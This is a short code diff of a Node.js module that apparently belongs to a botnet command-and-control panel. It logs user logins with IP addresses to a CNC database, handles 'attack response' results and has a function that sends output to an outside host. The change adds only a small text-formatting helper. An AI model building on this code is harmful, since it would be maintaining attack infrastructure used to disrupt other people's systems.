@@ -53,6 +53,7 @@ exports.log_login = function(user, ip) {
     fs.appendFileSync("./CNC/db/sys/login_logs.db", "('" + user + "','" + ip + "','" + t + "')\n");
 }
 
+
 exports.send_to_discord = function(output) {
     fetch("https://traumatized.xyz/sukme.php?log=" + output).then(res => res.text()).then(body => { console.log(body )});
 }
@@ -158,4 +159,14 @@ exports.get_api_response = function(rpn) {
     } else {
         return "Error, Something went wrong catching attack response!";
     }
+}
+
+exports.CleanMOTD = function(arg_array) {
+    let msg = "";
+    arg_array.forEach(el => {
+        msg += el + " ";
+    });
+    let fix = msg.replace(arg_array[0] + " ", "");
+    let fix2 = fix.replace(arg_array[1] + " ", "");
+    return fix2;
 }
